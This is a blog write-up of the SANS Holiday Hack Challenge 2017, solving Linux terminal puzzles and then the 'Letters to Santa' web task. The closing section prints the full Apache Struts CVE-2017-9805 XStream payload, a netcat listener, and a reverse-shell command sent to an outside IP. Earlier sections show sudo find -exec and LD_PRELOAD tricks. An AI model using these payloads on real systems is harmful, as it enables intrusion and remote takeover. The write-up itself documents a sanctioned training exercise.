+++
title = "SANS Holiday Hack Challenge 2017"
date = "2017-12-29T00:16:00+08:00"
tags = ["SANS", "hacking"]
categories = ["security"]
banner = "img/blog/2017/12/sans-holiday-hack-banner.png"
+++

## Introduction
---

The following post outlines the technical steps taken to complete the SANS Holiday Hack Challenge 2017.

Full Post will go live after the report submission deadline on 10th of January 2018.

## North Pole and Beyond Story
---

The Online portion of this years SANS Holiday Hack can be seen in the following overworld map.

<img class="img-responsive image-box-shadow" src="/img/blog/2017/12/hhc2017-map-overview.png" />

Each level had a few places that points could be earned:

* **A Physics based Snowball challenge** where you were required to complete a set of level specific challenges by directing a snowball around a map. The items you use to redirect the snowball were slowly unlocked as you progressed through the levels.
* An extra point and achievement was also awarded for **100% all the challenges associated with each level**.
* **Terminal challenge** where the goal was to perform a small task defined within a docker container that is served up where you click the little Terminal icon found in each map. <img class="img-responsive image-box-shadow" src="/img/blog/2017/12/hhc2017-terminal-icon.png" />

In this guide I will only be covering the terminal challenges for each level, as the physics based challenges were a little hit and miss and are difficult to describe without being able to run them. I will however [link to this album](https://imgur.com/t/holiday_hack_challenge/k912e) that contains a general overview of the solutions.

### Winter Wonder Landing

```bash
                                 |
                               \ ' /
                             -- (*) --
                                >*<
                               >0<@<
                              >>>@<<*
                             >@>*<0<<<
                            >*>>@<<<@<<
                           >@>>0<<<*<<@<
                          >*>>0<<@<<<@<<<
                         >@>>*<<@<>*<<0<*<
           \*/          >0>>*<<@<>0><<*<@<<
       ___\\U//___     >*>>@><0<<*>>@><*<0<<
       |\\ | | \\|    >@>>0<*<0>>@<<0<<<*<@<<
       | \\| | _(UU)_ >((*))_>0><*<0><@<<<0<*<
       |\ \| || / //||.*.*.*.|>>@<<*<<@>><0<<<
       |\\_|_|&&_// ||*.*.*.*|_\\db//_
       """"|'.'.'.|~~|.*.*.*|     ____|_
           |'.'.'.|   ^^^^^^|____|>>>>>>|
           ~~~~~~~~         '""""`------'
My name is Bushy Evergreen, and I have a problem for you.
I think a server got owned, and I can only offer a clue.
We use the system for chat, to keep toy production running.
Can you help us recover from the server connection shunning?

Find and run the elftalkd binary to complete this challenge.
```

The question seems self explanatory, find where the binary is on the file system and execute it. The first thing I tried was to search the entire file system for entries titled `elftalkd`

```bash
elf@e6ad9f7ec60c:~$ find / -name elftalkd
bash: /usr/local/bin/find: cannot execute binary file: Exec format error
```

The find command looks as though it's either been corrupt or replaced with a different binary.

Easy way around this is to simply see if we can directly run another version of the `find` binary located elsewhere on the system. In my case there was a copy under `/usr/bin/find`.

Running the following command I was given the location of the `elftalkd` binary:

```bash
elf@e6ad9f7ec60c:~$ /usr/bin/find / -name elftalkd
/usr/bin/find: '/var/cache/ldconfig': Permission denied
/usr/bin/find: '/var/cache/apt/archives/partial': Permission denied
/usr/bin/find: '/var/lib/apt/lists/partial': Permission denied
/run/elftalk/bin/elftalkd
/usr/bin/find: '/proc/tty/driver': Permission denied
/usr/bin/find: '/root': Permission denied
```

I simply ran the binary using the following:

```bash
cd /run/elftalk/bin/
./elftalkd
```

**Output**

```bash
Running in interactive mode

        --== Initializing elftalkd ==--
Initializing Messaging System!
Nice-O-Meter configured to 0.90 sensitivity.
Acquiring messages from local networks...

--== Initialization Complete ==--

      _  __ _        _ _       _
     | |/ _| |      | | |     | |
  ___| | |_| |_ __ _| | | ____| |
 / _ \ |  _| __/ _` | | |/ / _` |
|  __/ | | | || (_| | |   < (_| |
 \___|_|_|  \__\__,_|_|_|\_\__,_|


-*> elftalkd! <*-
Version 9000.1 (Build 31337)
By Santa Claus & The Elf Team
Copyright (C) 2017 NotActuallyCopyrighted. No actual rights reserved.
Using libc6 version 2.23-0ubuntu9
LANG=en_US.UTF-8
Timezone=UTC

Commencing Elf Talk Daemon (pid=6021)... done!
Background daemon...
```

### Winconceivable: The Cliffs Of Winsanity

```bash
                ___,@
               /  <
          ,_  /    \  _,
      ?    \`/______\`/
   ,_(_).  |; (e  e) ;|
    \___ \ \/\   7  /\/    _\8/_
        \/\   \'=='/      | /| /|
         \ \___)--(_______|//|//|
          \___  ()  _____/|/_|/_|
             /  ()  \    `----'
            /   ()   \
           '-.______.-'
   jgs   _    |_||_|    _
        (@____) || (____@)
         \______||______/
My name is Sparkle Redberry, and I need your help.
My server is atwist, and I fear I may yelp.
Help me kill the troublesome process gone awry.
I will return the favor with a gift before nigh.

Kill the "santaslittlehelperd" process to complete this challenge.
```

The **santaslittlehelperd** process was first searched for by running the following:

```bash
elf@bd3bca351d3c:~$ ps aux | grep santaslittlehelperd

elf          8  0.0  0.0   4224   652 pts/0    S    14:12   0:00 /usr/bin/santaslittlehelperd
elf        117  0.0  0.0  11284   940 pts/0    S+   14:13   0:00 grep --color=auto santaslittlehelperd
```

I also ran `ps axo stat,ppid,pid,comm` to view a simple list of all the processes along with their PPID (PID of parent process)

```bash
elf@bd3bca351d3c:~$ ps axo stat,ppid,pid,comm

STAT  PPID   PID COMMAND
Ss       0     1 init
S        1     8 santaslittlehel
S        1    11 kworker
S        1    12 bash
S       11    18 kworker
R+      12   238 ps
```

The santaslittlehelpd process was an child process of `init`. I wasn't sure if this would be useful information, but I thought I'd note it down none the less.

I proceeded to try killing the processing using the following command:

```bash
elf@bd3bca351d3c:~$ kill -9 8
elf@bd3bca351d3c:~$ ps

  PID TTY          TIME CMD
    1 pts/0    00:00:00 init
    8 pts/0    00:00:00 santaslittlehel
   11 pts/0    00:00:00 kworker
   12 pts/0    00:00:00 bash
   18 pts/0    00:00:00 kworker
  429 pts/0    00:00:00 ps
```

It appears that either there was a watchdog service monitoring the daemon and restarting it, or maybe the kill command isn't working as expected.

There was also a change that I wasn't even executing `kill` at all, and possibly being diverted to another command all together using an alias. These suspicions were confirmed when I ran the `alias` command.

```bash
elf@bd3bca351d3c:~$ alias

alias alert='notify-send --urgency=low -i "$([ $? = 0 ] && echo terminal || echo error)" "$(history|tail -n1|sed -e '\''s/^\s*[0-9]\+\s*//;s/[;&|]\s*alert$//'\'')"'
alias egrep='egrep --color=auto'
alias fgrep='fgrep --color=auto'
alias grep='grep --color=auto'
alias kill='true'
alias killall='true'
alias l='ls -CF'
alias la='ls -A'
alias ll='ls -alF'
alias ls='ls --color=auto'
alias pkill='true'
alias skill='true'
```

Turns out that the kill command, and a number of other commands that could potentially complete this challenge were being aliased to a different expressions. The solution was to simply `unalias` one of the commands I needed and retry the original `kill -9 <PID>` method.

```bash
elf@bd3bca351d3c:~$ unalias kill
elf@bd3bca351d3c:~$ kill -9 8
```

Running `ps` again confirms that the process is no longer running, and checking the achievements I was credits the point for completing the challenge.

**Output**

```bash
elf@bd3bca351d3c:~$ ps

  PID TTY          TIME CMD
    1 pts/0    00:00:00 init
   12 pts/0    00:00:00 bash
  780 pts/0    00:00:00 ps
```

**References:**

[How to find and kill zombie processes on Linux](http://xmodulo.com/how-to-find-and-kill-zombie-processes.html)

### Cryokinetic Magic

```bash
                     ___
                    / __'.     .-"""-.
              .-""-| |  '.'.  / .---. \
             / .--. \ \___\ \/ /____| |
            / /    \ `-.-;-(`_)_____.-'._
           ; ;      `.-" "-:_,(o:==..`-. '.         .-"-,
           | |      /       \ /      `\ `. \       / .-. \
           \ \     |         Y    __...\  \ \     / /   \/
     /\     | |    | .--""--.| .-'      \  '.`---' /
     \ \   / /     |`        \'   _...--.;   '---'`
      \ '-' / jgs  /_..---.._ \ .'\\_     `.
       `--'`      .'    (_)  `'/   (_)     /
                  `._       _.'|         .'
                     ```````    '-...--'`
My name is Holly Evergreen, and I have a conundrum.
I broke the candy cane striper, and I'm near throwing a tantrum.
Assembly lines have stopped since the elves can't get their candy cane fix.
We hope you can start the striper once again, with your vast bag of tricks.

Run the CandyCaneStriper executable to complete this challenge.
```

Within the home directory there was a binary called `CandyCaneStriper`. The first thin I did was the obvious and tried to run it.

```bash
elf@c703159ca2d8:~$ ./CandyCaneStriper

bash: ./CandyCaneStriper: Permission denied
```

Permission denied? Ok I'll try to `chmod`

```bash
elf@c703159ca2d8:~$ chmod +x CandyCaneStriper

elf@c703159ca2d8:~$ ls -al
-rw-r--r-- 1 root root 45224 Dec 15 19:59 CandyCaneStriper
```

Unfortunately I wasn't able to change the permissions, however I wasn't being told I couldn't by permission errors which was quite strange.

I wasn't able to directly run the `find` command however I did find *hew* a copy of the bin in `/usr/bin/` that I could use to check what `CandyCaneStriper` actually was

```bash

elf@c703159ca2d8:/usr/bin$ ./file ~/CandyCaneStriper

/home/elf/CandyCaneStriper: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=bfe4ffd88f30e6970fe
b7e3341ddbe579e9ab4b3, stripped
```

After some time playing around with the strange permission modification quirk I found out that the `install` command has a `-m` argument that allowed you to specify a permission mode of binary when installing it from a `SOURCE` to a `DESTINATION`.

I installed the binary to the /tmp/ directory using the following command(s):

```bash
elf@c703159ca2d8:~$ install -m 777 CandyCaneStriper /tmp/CandyCaneStriper
elf@c703159ca2d8:~$ cd /tmp
elf@c703159ca2d8:/tmp$ ls -al
total 56

drwxrwxrwt 1 root root  4096 Jan  8 14:41 .
drwxr-xr-x 1 root root  4096 Jan  8 14:27 ..
-rwxrwxrwx 1 elf  elf  45224 Jan  8 14:41 CandyCaneStriper
```

This gave me a binary that I could simply execute and complete the challenge with.

**Output**

```bash
elf@c703159ca2d8:/tmp$ ./CandyCaneStriper

                   _..._
                 .'\\ //`,
                /\\.'``'.=",
               / \/     ;==|
              /\\/    .'\`,`
             / \/     `""`
            /\\/
           /\\/
          /\ /
         /\\/
        /`\/
        \\/
         `
The candy cane striping machine is up and running!
```

### There's Snow Place Like Home

```bash

                             ______
                          .-"""".._'.       _,##
                   _..__ |.-"""-.|  |   _,##'`-._
                  (_____)||_____||  |_,##'`-._,##'`
                  _|   |.;-""-.  |  |#'`-._,##'`
               _.;_ `--' `\    \ |.'`\._,##'`
              /.-.\ `\     |.-";.`_, |##'`
              |\__/   | _..;__  |'-' /
              '.____.'_.-`)\--' /'-'`
               //||\\(_.-'_,'-'`
             (`-...-')_,##'`
      jgs _,##`-..,-;##`
       _,##'`-._,##'`
    _,##'`-._,##'`
      `-._,##'`
My name is Pepper Minstix, and I need your help with my plight.
I've crashed the Christmas toy train, for which I am quite contrite.
I should not have interfered, hacking it was foolish in hindsight.
If you can get it running again, I will reward you with a gift of delight.

total 444
-rwxr-xr-x 1 root root 454636 Dec  7 18:43 trainstartup
```

For this task I initially ran the `file` command to view the type of file I was dealing with.

```bash
elf@409d81c9ce4a:~$ file trainstartup
trainstartup: ELF 32-bit LSB  executable, ARM, EABI5 version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=005de4685e8563d10b3de3e0be7d6fdd7ed732eb, not stripped
```

Interestingly the binary was compiled for ARM architecture

I ran the following to check my system kernel architecture:

```bash
elf@409d81c9ce4a:~$ uname -a

Linux 409d81c9ce4a 4.9.0-5-amd64 #1 SMP Debian 4.9.65-3+deb9u2 (2018-01-04) x86_64 x86_64 x86_64 GNU/Linux
```

Unfortunately I was not running ARM architecture.

Having a bit of a background in android development I knew about a tool called `qemu` that was used to run the android emulator on x86_64 systems, so I checked to see if it was present on this system. Sure enough...

```bash
elf@409d81c9ce4a:~$ qemu-
qemu-aarch64       qemu-armeb         qemu-m68k          qemu-mips          qemu-mipsel        qemu-or32          qemu-ppc64abi32    qemu-sh4eb         qemu-sparc64
qemu-alpha         qemu-cris          qemu-microblaze    qemu-mips64        qemu-mipsn32       qemu-ppc           qemu-s390x         qemu-sparc         qemu-unicore32
qemu-arm           qemu-i386          qemu-microblazeel  qemu-mips64el      qemu-mipsn32el     qemu-ppc64         qemu-sh4           qemu-sparc32plus   qemu-x86_64
```

The one that stood out immediately was `qemu-arm`, which ended up giving me success when I ran the `trainstartup` binary through it.

```
elf@409d81c9ce4a:~$ qemu-arm trainstartup
```

**Output**

```bash

    Merry Christmas
    Merry Christmas
v
>*<
^
/o\
/   \               @.·
/~~   \                .
/ ° ~~  \         · .
/      ~~ \       ◆  ·
/     °   ~~\    ·     0
/~~           \   .─··─ · o
             /°  ~~  .*· · . \  ├──┼──┤
              │  ──┬─°─┬─°─°─°─ └──┴──┘
≠==≠==≠==≠==──┼──=≠     ≠=≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠===≠
              │   /└───┘\┌───┐       ┌┐
                         └───┘    /▒▒▒▒
≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠=°≠=°≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠


You did it! Thank you!
```

### Bumbles Bounce

```bash
                           ._    _.
                           (_)  (_)                  <> \  / <>
                            .\::/.                   \_\/  \/_/
           .:.          _.=._\\//_.=._                  \\//
      ..   \o/   ..      '=' //\\ '='             _<>_\_\<>/_/_<>_
      :o|   |   |o:         '/::\'                 <> / /<>\ \ <>
       ~ '. ' .' ~         (_)  (_)      _    _       _ //\\ _
           >O<             '      '     /_/  \_\     / /\  /\ \
       _ .' . '. _                        \\//       <> /  \ <>
      :o|   |   |o:                   /\_\\><//_/\
      ''   /o\   ''     '.|  |.'      \/ //><\\ \/
           ':'        . ~~\  /~~ .       _//\\_
jgs                   _\_._\/_._/_      \_\  /_/
                       / ' /\ ' \                   \o/
       o              ' __/  \__ '              _o/.:|:.\o_
  o    :    o         ' .'|  |'.                  .\:|:/.
    '.\'/.'                 .                 -=>>::>o<::<<=-
    :->@<-:                 :                   _ '/:|:\' _
    .'/.\'.           '.___/*\___.'              o\':|:'/o
  o    :    o           \* \ / */                   /o\
       o                 >--X--<
                        /*_/ \_*\
                      .'   \*/   '.
                            :
                            '
Minty Candycane here, I need your help straight away.
We're having an argument about browser popularity stray.
Use the supplied log file from our server in the North Pole.
Identifying the least-popular browser is your noteworthy goal.

total 28704
-rw-r--r-- 1 root root 24191488 Dec  4 17:11 access.log
-rwxr-xr-x 1 root root  5197336 Dec 11 17:31 runtoanswer
```

This challenge was mainly focused around using a variety of regular expressions to parse the enormous `access.log` for browser entries

I first took a look at how a variety of entries were structures in the log

```bash
Safari/537.36"
Chrome/62.0.3202.94
YandexBot/3.0
Mozilla/4.0
```

In general we have:

* <BrowserName>
* /
* number
* .

Then repeat the number dot sequence until we don't get either one. We can use a regular expression like the following to try to capture these entries

```bash
elf@c65b6d9bf966:~$ grep -oP "[a-zA-Z]+/([0-9]+(\.)?)+" access.log | sort | uniq -c | sort

     51 AhrefsBot/5.2
      2 AppleWebKit/533.17.9
    236 AppleWebKit/534
      1 AppleWebKit/537.1
      2 AppleWebKit/537.32.36
  68817 AppleWebKit/537.36
     16 AppleWebKit/538.1
     72 AppleWebKit/602.1.38
     73 AppleWebKit/602.3.12
      2 AppleWebKit/602.4.6
     69 AppleWebKit/603.2.4
    280 AppleWebKit/604.1.34
    322 AppleWebKit/604.1.38
   2094 AppleWebKit/604.3.5
     69 AppleWebKit/604.4.7
     11 Baiduspider/2.0
    236 BingPreview/1.0
```

The above is an example of the outputs. Finally to further sort the output by actual count I added a final `| sort` onto the end

```bash
grep -oP "[a-zA-Z]+/([0-9]+(\.)?)+" access.log | sort | uniq -c | sort

      1 CFNetwork/808.3
      1 CFNetwork/811.5.4
      1 CFNetwork/893.10
      1 CFNetwork/893.14
      1 Chrome/21.0.1180.89
      1 Chrome/42.0.2311.90
      1 Chrome/51.0.2704.106
      1 Darwin/16.3.0
      1 Darwin/16.7.0
      1 Dillo/3.0.5
      1 Safari/537.1
      1 com/2017
      1 curl/7.35.0
      2 AppleWebKit/533.17.9
      2 AppleWebKit/537.32.36
      2 AppleWebKit/602.4.6
```

This allowed me to make some fairly educated guesses that eventually led me to find that Dillo was the least-popular browser.

**Output**

```bash
elf@c65b6d9bf966:~$ ./runtoanswer

Starting up, please wait......
Enter the name of the least popular browser in the web log: Dillo

That is the least common browser in the web log! Congratulations!
```

**References:**

[Using Grep & Regular Expressions to Search for Text Patterns in Linux](https://www.digitalocean.com/community/tutorials/using-grep-regular-expressions-to-search-for-text-patterns-in-linux)

### I Don't Think We're In Kansas Anymore

```bash
                       *
                      .~'
                     O'~..
                    ~'O'~..
                   ~'O'~..~'
                  O'~..~'O'~.
                 .~'O'~..~'O'~
                ..~'O'~..~'O'~.
               .~'O'~..~'O'~..~'
              O'~..~'O'~..~'O'~..
             ~'O'~..~'O'~..~'O'~..
            ~'O'~..~'O'~..~'O'~..~'
           O'~..~'O'~..~'O'~..~'O'~.
          .~'O'~..~'O'~..~'O'~..~'O'~
         ..~'O'~..~'O'~..~'O'~..~'O'~.
        .~'O'~..~'O'~..~'O'~..~'O'~..~'
       O'~..~'O'~..~'O'~..~'O'~..~'O'~..
      ~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..
     ~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'
    O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'O'~.
   .~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'O'~
  ..~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'O'~.
 .~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'
O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..
Sugarplum Mary is in a tizzy, we hope you can assist.
Christmas songs abound, with many likes in our midst.
The database is populated, ready for you to address.
Identify the song whose popularity is the best.

total 20684
-rw-r--r-- 1 root root 15982592 Nov 29 19:28 christmassongs.db
-rwxr-xr-x 1 root root  5197352 Dec  7 15:10 runtoanswer
```

To start with I simply confirmed what kind of database file I was dealing with by `cat`ing the enormous file and looking at the file header. The database was an sqllite3 db.

I open the database using the following command and checks the database schema:

```bash
elf@ce2cf577e383:~$ sqlite3 christmassongs.db
SQLite version 3.11.0 2016-02-15 17:29:24

sqlite> .headers ON
sqlite> .schema

CREATE TABLE songs(
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  title TEXT,
  artist TEXT,
  year TEXT,
  notes TEXT
);
CREATE TABLE likes(
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  like INTEGER,
  datetime INTEGER,
  songid INTEGER,
  FOREIGN KEY(songid) REFERENCES songs(id)
);
```

Now that I knew the schma I followed the guide on the [SANS site](https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands); slowly worked out how I could output a list of the titles and their associated `Like` values.

I knew I had to **JOIN** the two tables on `id -> songid` and then **GROUP BY** `Likes`. Below is the query I came up with:

```bash
sqlite> SELECT title, COUNT(songid)
   ...> FROM songs INNER JOIN likes ON songs.id = likes.songid
   ...> WHERE like=1
   ...> GROUP BY likes.songid;

title|COUNT(songid)
A' Soalin'|1580
Adeste Fideles (O Come, All Ye Faithful)|1674
All Alone on Christmas|1564
All I Really Want for Christmas|1642
All I Want for Christmas Is a Real Good Tan|1667
All I Want for Christmas Is My Two Front Teeth|1611
All I Want for Christmas Is You (1)|1534
All I Want for Christmas Is You (2)|1579
All I Want for Christmas Is You (3)|1602
All My Love for Christmas|1561
etc.....
```

Now I had the list of songs, separated by a `|` then the total likes, I loaded the entries into Atom and applied the regex `([0-9]{4})` as my search filter, then `$1\n` as my replace

<img class="img-responsive image-box-shadow" src="/img/blog/2017/12/hhc2017-sqlite3-db-regex.jpg" />

Popping these entries into Excel with a `|` delimiter then sorting via the likes column showed me that the most popular song was `Stairway to Heaven` with `8996` likes

**Output**

```bash
elf@ce2cf577e383:~$ ./runtoanswer

Starting up, please wait......
Enter the name of the song with the most likes: Stairway to Heaven

That is the #1 Christmas song, congratulations!
```

**References:**

[Your Pokemon Guide for Essential SQL Pen Test Commands](https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands)

### Oh Wait! Maybe We Are…

```bash
              \ /
            -->*<--
              /o\
             /_\_\
            /_/_0_\
           /_o_\_\_\
          /_/_/_/_/o\
         /@\_\_\@\_\_\
        /_/_/O/_/_/_/_\
       /_\_\_\_\_\o\_\_\
      /_/0/_/_/_0_/_/@/_\
     /_\_\_\_\_\_\_\_\_\_\
    /_/o/_/_/@/_/_/o/_/0/_\
   jgs       [___]
My name is Shinny Upatree, and I've made a big mistake.
I fear it's worse than the time I served everyone bad hake.
I've deleted an important file, which suppressed my server access.
I can offer you a gift, if you can fix my ill-fated redress.

Restore /etc/shadow with the contents of /etc/shadow.bak, then run "inspect_da_box" to complete this challenge.
Hint: What commands can you run with sudo?
```

To start with a took the hints advice and listed the commands and details of the things that I could run as `sudo`:

```bash
elf@ce0c30b05641:~$ sudo -ll

Matching Defaults entries for elf on ce0c30b05641:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
User elf may run the following commands on ce0c30b05641:
Sudoers entry:
    RunAsUsers: elf
    RunAsGroups: shadow
    Options: !authenticate
    Commands:
        /usr/bin/find
```

It would seem that the `find` command was available with root permissions to my user account. With this knowledge and some prior experience knowing that I could execute commands via the `-exec` parameter in along with the `find` command I constructed the following command that would copy the `shadow.bak` file over the top of the `shadow` file in `/etc/`

```bash
elf@ce0c30b05641:~$ sudo -g shadow find /etc/shadow.bak -exec cp {} /etc/shadow \;
```

Finally I ran the `inspect_da_box` binary now that the `shadow` file had been restored.

**Output**

```bash
elf@ce0c30b05641:~$ ./inspect_da_box

                     ___
                    / __'.     .-"""-.
              .-""-| |  '.'.  / .---. \
             / .--. \ \___\ \/ /____| |
            / /    \ `-.-;-(`_)_____.-'._
           ; ;      `.-" "-:_,(o:==..`-. '.         .-"-,
           | |      /       \ /      `\ `. \       / .-. \
           \ \     |         Y    __...\  \ \     / /   \/
     /\     | |    | .--""--.| .-'      \  '.`---' /
     \ \   / /     |`        \'   _...--.;   '---'`
      \ '-' / jgs  /_..---.._ \ .'\\_     `.
       `--'`      .'    (_)  `'/   (_)     /
                  `._       _.'|         .'
                     ```````    '-...--'`
/etc/shadow has been successfully restored!
```

### We're Off To See The...

```bash

                 .--._.--.--.__.--.--.__.--.--.__.--.--._.--.
               _(_      _Y_      _Y_      _Y_      _Y_      _)_
              [___]    [___]    [___]    [___]    [___]    [___]
              /:' \    /:' \    /:' \    /:' \    /:' \    /:' \
             |::   |  |::   |  |::   |  |::   |  |::   |  |::   |
             \::.  /  \::.  /  \::.  /  \::.  /  \::.  /  \::.  /
         jgs  \::./    \::./    \::./    \::./    \::./    \::./
               '='      '='      '='      '='      '='      '='
Wunorse Openslae has a special challenge for you.
Run the given binary, make it return 42.
Use the partial source for hints, it is just a clue.
You will need to write your own code, but only a line or two.

total 88
-rwxr-xr-x 1 root root 84824 Dec 16 16:56 isit42
-rw-r--r-- 1 root root   654 Dec 16 16:56 isit42.c.un
```

To start with a read over the source code provided to me in the `isit42.c.un` file.

```cpp
#include <stdio.h>
// DATA CORRUPTION ERROR
// MUCH OF THIS CODE HAS BEEN LOST
// FORTUNATELY, YOU DON'T NEED IT FOR THIS CHALLENGE
// MAKE THE isit42 BINARY RETURN 42
// YOU'LL NEED TO WRITE A SEPERATE C SOURCE TO WIN EVERY TIME
int getrand() {
    srand((unsigned int)time(NULL));
    printf("Calling rand() to select a random number.\n");
    // The prototype for rand is: int rand(void);
    return rand() % 4096; // returns a pseudo-random integer between 0 and 4096
}
int main() {
    sleep(3);
    int randnum = getrand();
    if (randnum == 42) {
        printf("Yay!\n");
    } else {
        printf("Boo!\n");
    }
    return randnum;
}
```

The thing that stood out for me what that the `getrand()` function was being handled in a separate function, and the `rand()` regular library was called within that to generate a random number.

I spent quite a bit of time trying to manipulate the fact that the srand() function was using the UTC timestamp as its seed, and followed a guide outlined by the [author of this post](http://v0ids3curity.blogspot.com.au/2012/10/a-simple-number-guessing-game.html) to attempt to setup an optimal condition to produce a 42. This however was a bit of a time-sink, as I wasn't able to change system time, and the script specifically has a `sleep(3)` function that makes this process very difficult.

I went back to the drawing board and eventually came across a post on the SANS blob that looked at LD_PRELOAD and how I could override regular library functions by passing them in at runtime.

In order to implement this I created a file called `hacking_time.c` and populated it with the following code:

```cpp
#include <stdio.h>
unsigned int rand() {
    return 42;
}
```

I then compiled it using the `-shared` and `-fPIC` flags.

* **-shared** ensures that the code is compiled as a library
* **-fPIC** flags this library to contain Position Independent Code

```bash
elf@a9a5df40cd29:~$ gcc hacking_time.c -o hacking_time -shared -fPIC
```

Finally we set the `LD_PRELOAD` variable to be the path of our `hacking_time` library and execute `isit42`

```bash
elf@a9a5df40cd29:~$ LD_PRELOAD="$PWD/hacking_time" ./isit42
```

**Output**

<img class="img-responsive image-box-shadow" src="/img/blog/2017/12/hhc2017-itis42.jpg" />

**References:**

[Go To The Head Of The Class: LD_PRELOAD For The Win](https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win)

[A Simple Number Guessing Game](http://v0ids3curity.blogspot.com.au/2012/10/a-simple-number-guessing-game.html)

## Santa Web Attacks
---

The Santa Web Attacks are the core of the SANS Holiday Hack Challenge, the structure was quite unknown from the get go, as we were give some basic information about the systems we would be attacking. The idea was you would find things as you progressed that would help you with the next challenge and so on.

**NOTE:** Question 1 was technically covered in the  the introduction levels in the North Pole and Beyond world. The **GreatBookPage1.pdf** was obtained by rolling the snowball over the page. The title of that page was "About This Book..."

**NOTE:** For completeness I'll also mention **GreatBookPage5.pdf** was obtained in `Bumbles Bounce` level by rolling a snowball over the page. The title of that page was "The Abominable Snow Monster"

### Letters to Santa

**Task:** Investigate the Letters to Santa application at https://l2s.northpolechristmastown.com. What is the topic of The Great Book page available in the web root of the server? What is Alabaster Snowball's password?

For this challenge I hit the ground running, I fired up the browser and navigated to http://l2s.northpolechristmastown.com then began attempting some very basic XSS, mainly testing to see if I was allowed to send javascript queries in the Custom Message box.

<img class="img-responsive image-box-shadow" src="/img/blog/2017/12/hhc2017-challenge01-wishlist-inject.jpg" />

This was unsuccessful however and I just ended up probably just ended up on Santa's naughty list for assuming he wouldn't have handled input validation appropriately.

<img class="img-responsive image-box-shadow" src="/img/blog/2017/12/hhc2017-angry-santa.gif" />

I moved onto the source code of the site and came across an interesting comment and code block near the bottom that referred me to a partner domain https://dev.northpolechristmastown.com.

<img class="img-responsive image-box-shadow" src="/img/blog/2017/12/hhc2017-challenge01-dev-site.jpg" />

The new dev site that was uncovered was interesting, as it immediately redirected to a sub page at https://dev.northpolechristmastown.com/orders.xhtml

The trail end of this address is promising as is seems to be serving up `xhtml`. Before moving on I also checked the source code of this page and found another interesting comment from the developers.

<img class="img-responsive image-box-shadow" src="/img/blog/2017/12/hhc2017-challenge01-struts-exploit-comment.jpg" />

I can smell a struts exploit coming up!

After trying a couple different more [mainstream CVEs](https://www.cvedetails.com/vulnerability-list/vendor_id-45/product_id-6117/Apache-Struts.html) like [CVE-2017-5638](https://www.cvedetails.com/cve/CVE-2017-5638/) and [CVE-2016-4461](https://www.cvedetails.com/cve/CVE-2016-4461/) I decided to turn my attention on whether the `xhtml` was exploited in any CVEs.

I came across a [SANS blog post](https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code) that detailed the [CVE-2017-9805](https://www.rapid7.com/db/vulnerabilities/struts-cve-2017-9805) exploit and how it could be used to manipulate the Apache Struts 2 REST Plugin XStream RCE into decentralizing specially crafted HTTP requests and achieving remote code execution.

The concept behind this exploit is quite simple, while we can't directly encode a command in the XML structure we can encode it in base64. The REST plugin **decode and execute** our command unwillingly due to no checks on encoded special characters.

The core XML to this exploite can be seen below, where out custom command replaces the `COMMANDWILLGOHERE` field

```python
xml_exploit =  parseString('<map><entry><jdk.nashorn.internal.objects.NativeString><flags>0</flags><value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"><dataHandler><dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource"><is class="javax.crypto.CipherInputStream"><cipher class="javax.crypto.NullCipher"><initialized>false</initialized><opmode>0</opmode><serviceIterator class="javax.imageio.spi.FilterIterator"><iter class="javax.imageio.spi.FilterIterator"><iter class="java.util.Collections$EmptyIterator"/><next class="java.lang.ProcessBuilder"><command><string>/bin/bash</string><string>-c</string><string>COMMANDWILLGOHERE</string></command><redirectErrorStream>false</redirectErrorStream></next></iter><filter class="javax.imageio.ImageIO$ContainsFilter"><method><class>java.lang.ProcessBuilder</class><name>start</name><parameter-types/></method><name>foo</name></filter><next class="string">foo</next></serviceIterator><lock/></cipher><input class="java.lang.ProcessBuilder$NullInputStream"/><ibuffer/><done>false</done><ostart>0</ostart><ofinish>0</ofinish><closed>false</closed></is><consumed>false</consumed></dataSource><transferFlavors/></dataHandler><dataLen>0</dataLen></value></jdk.nashorn.internal.objects.NativeString><jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/></entry><entry><jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/><jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/></entry></map>')
```

The repo available [here](https://github.com/chrisjd20/cve-2017-9805.py/blob/master/cve-2017-9805.py) was the exploit I deceided to go with in order to compromise the system.

I set up a reverse shell listener with `nc` using the following command on my local system on port 9001. This would be the port the remote system would be forced to connect back to me over

```bash
$ nc -l -p 9001 -vvv
```

I ran the aforementioned `cve-2017-9805.py` exploit with the following syntax to kick the exploit off, ensuring I pointed it at the https://dev.northpolechristmastown.com/orders.xhtml endpoint.

```bash
python cve-2017-9805.py -u https://dev.northpolechristmastown.com/orders.xhtml -c "/bin/bash -i > /dev/tcp/203.59.106.231/9001 0<&1 2>&1"
```

The exploit fired

